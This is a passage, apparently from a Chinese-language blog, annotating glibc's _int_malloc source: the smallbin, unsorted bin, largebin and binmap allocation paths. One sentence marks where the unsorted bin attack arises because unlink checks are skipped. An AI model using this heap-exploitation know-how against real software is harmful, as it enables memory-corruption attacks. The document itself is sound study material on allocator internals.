<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !MALLOC_DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_free_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloc_state(A)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之后定义加了”do_”的函数名，所以如果没有设置<code>MALLOC_DEBUG</code>是无法通过<code>check_remalloc_chunk</code>找到<code>do_check_remalloc_chunk</code>的，就什么都不会执行。</p>
<p>之后进入 smallbins 的判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))  <span class="comment">//判断size</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);  <span class="comment">//获取idnex</span></span><br><span class="line">      bin = bin_at (av, idx);  <span class="comment">//获取bins[index]</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)  <span class="comment">//判断是否为空，把bin-&gt;bk赋给victim</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);  <span class="comment">//整理fastbins中的chunk加入到unsortedbins</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))  <span class="comment">//若victim-&gt;bk-&gt;fd!=victim</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置P位</span></span><br><span class="line">              bin-&gt;bk = bck;  <span class="comment">//从链表尾取出</span></span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  <span class="comment">//设置A位</span></span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);  <span class="comment">//debug函数</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  <span class="comment">//指针指向数据区</span></span><br><span class="line">              alloc_perturb (p, bytes);  <span class="comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              <span class="keyword">return</span> p;  <span class="comment">//返回chunk</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>若 size 输入 smallbins，则先通过 size 获取 index，再通过 index 获取该分配区对应的 smallbin，检查是否为空，检查是否初始化，检查<code>victim-&gt;bk-&gt;fd==victim</code>，满足则取出该 chunk 设置相关标识返回。</p>
<p>若 size 满足 largebins，会先将 fastbins 整理到 unsortedbin中，若只是在之前的 bins 中没有找到合适的 chunk 导致分配失败则不执行这段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之后才是 malloc 的核心代码，代码量很大就不全贴了需要自查，这段使用了很多循环嵌套，主要目的是处理之前分配失败的请求</p>
<p>malloc.c注释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">   it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">   the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">   bins.  Note that this step is the only place in any routine where</span><br><span class="line">   chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">   The outer loop here is needed because we might not realize until</span><br><span class="line">   near the end of malloc that we should have consolidated, so must</span><br><span class="line">   do so and retry. This happens at most once, and only when we would</span><br><span class="line">   otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先遍历查找 unsorted bin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))  <span class="comment">//取unsortedbin-&gt;bk并判断是否为空</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  <span class="comment">//取victim-&gt;bk</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))  <span class="comment">//判断size</span></span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>尝试切割 unsorted bin 中的chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;  <span class="comment">//size在smallbin范围</span></span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;  <span class="comment">//unsorted bin中只有一个chunk</span></span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;  <span class="comment">//该chunk是当前分配区的last_remainder</span></span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))  <span class="comment">//该chunk的size大于所需size</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;  <span class="comment">//计算切割后剩余size</span></span><br><span class="line">              remainder = chunk_at_offset (victim, nb);  <span class="comment">//切割chunk</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;  <span class="comment">//将remainder放回unsorted bin</span></span><br><span class="line">              av-&gt;last_remainder = remainder; <span class="comment">//修改last_remainder</span></span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);  <span class="comment">//remainder的fd和bk指针指向unsorted bin</span></span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))  <span class="comment">//若remainder的size属于largebins，因为不在largebins中，清空fd_nextsize和bk_nextsize</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>)); <span class="comment">//给victim设置chunk结构</span></span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);  <span class="comment">//给remainder设置chunk结构</span></span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);  <span class="comment">//debug函数</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  <span class="comment">//获取指向数据区的指针</span></span><br><span class="line">              alloc_perturb (p, bytes);  <span class="comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>若不满足切割条件则尝试精准匹配 unsorted bin，遍历 unsorted bin，精准匹配成功则返回，匹配失败则将该 chunk 整理到对应的 bin 中，所以若遍历之后都没有精准匹配 unsorted bin 就会被清空。</p>
<p>取出 unsorted bin 中最后一个 chunk，即之前的 victim，这里没有使用 unlink，unsorted bin attack 的漏洞就在这里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">		<span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>若实现精准匹配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">		<span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)  <span class="comment">//若精准匹配</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);  <span class="comment">//设置P位</span></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  <span class="comment">//根据是否是主分配区设置A位</span></span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb); <span class="comment">//debug函数</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim); <span class="comment">//获取指向数据区的指针</span></span><br><span class="line">              alloc_perturb (p, bytes); <span class="comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              <span class="keyword">return</span> p;  <span class="comment">//返回指向数据区的指针</span></span><br><span class="line">            &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>若不能精准匹配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">		<span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))  <span class="comment">//size属于smallbins</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);  <span class="comment">//获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);  <span class="comment">//获取bins[index]</span></span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//获取bins[index]-&gt;fd</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);  <span class="comment">//获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);  <span class="comment">//获取bins[index]</span></span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//获取bins[index]-&gt;fd</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)  <span class="comment">//largebin不为空则按照size将victim插入largebin的size link中</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);  <span class="comment">//将victim插入到bin</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)  <span class="comment">//若寻找次数太多则跳出循环</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>不能匹配的情况下若 size 属于smallbin 则加入到对应的 smallbin 中，若 size 属于 largebin 则加入到对应的 largebin 中，不过需要注意 largebin 的<code>fd_nextsize</code>和<code>bk_nextsize</code>字段的特殊性，加入时需要额外代码处理这两个字段达到排序目的,这段代码有点怪怪的我没有完全搞懂….</p>
<p>unsorted bin 分配过程图示：</p>
<p><img src="https://z3.ax1x.com/2021/05/16/gg7Z1U.png"></p>
<p>如果到这里都无法找到合适的 chunk，说明请求可能是 large request，或者fastbins、smallbins、unsortedbin都无法满足条件，就会搜索 largebins</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">	   <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))  <span class="comment">//判断是否属于smallbin</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);  <span class="comment">//获取largebin，idx在之前判断size属于largebin时被赋值</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;  <span class="comment">//bin非空</span></span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//size小于链表中的max size</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;  <span class="comment">//从最小的chunk开始</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))  <span class="comment">//按照size从小到大依次寻找</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)  <span class="comment">//避免删掉作为长度标识的chunk</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;  <span class="comment">//计算切割后的神予size</span></span><br><span class="line">              unlink (av, victim, bck, fwd);  <span class="comment">//将该chunk unlink</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)  <span class="comment">//切割后剩余大小不足以单独使用则不切割全部分配</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);  <span class="comment">//设置P位</span></span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;  <span class="comment">//设置A位</span></span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span>  <span class="comment">//切割</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))  <span class="comment">//unsortedbin链表检查</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;  <span class="comment">//将切割剩余部分放入unsortedbin</span></span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))  <span class="comment">//若remainder的size属于largebins，因为不在largebins中，清空fd_nextsize和bk_nextsize</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));  <span class="comment">//设置victim的chunk结构</span></span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);  <span class="comment">//设置remainder的chunk结构</span></span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);  <span class="comment">//debug函数</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  <span class="comment">//获取指向数据区的指针</span></span><br><span class="line">              alloc_perturb (p, bytes);  <span class="comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              <span class="keyword">return</span> p;  <span class="comment">//返回指向数据区的指针</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>从该 largebin 中按照尺寸大小寻找匹配的 chunk，若有相同大小则尽量不返回其中排在最前面的作为尺寸标识的那一个，找到后如果可以分割，剩下的 chunk 还可以使用就分割，否则全部返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">   bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">   (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">   that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">   The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">   when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>若在该 largebin 没有找到合适的 chunk，找下一个 largebin，查询 binmap 表，binmap 表的作用是标识每一个 bin 是否为空，之前 main_arena 中讲过，用 binmap 标识可以加快查找速度。</p>
<blockquote>
<p>binmap 的大致原理。binmap 一共 128 bit，16 个字节，分成 4 个 int 变量，每一个 int 变量称为一个 block，每个 block 有 32 个 bit，最多可以表示 32 个 bin 的状态，使用宏 idx2block 可以计算出一个 index(bin) 在 binmap 中属于哪个 block。 idx2bit 宏取第 i 位为1，剩下的置 0，例如 idx2bit(2) 会生成 “00000000000000000000000000000100”</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);  <span class="comment">//遍历binmap表找有空闲chunk的largebin</span></span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)</span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span 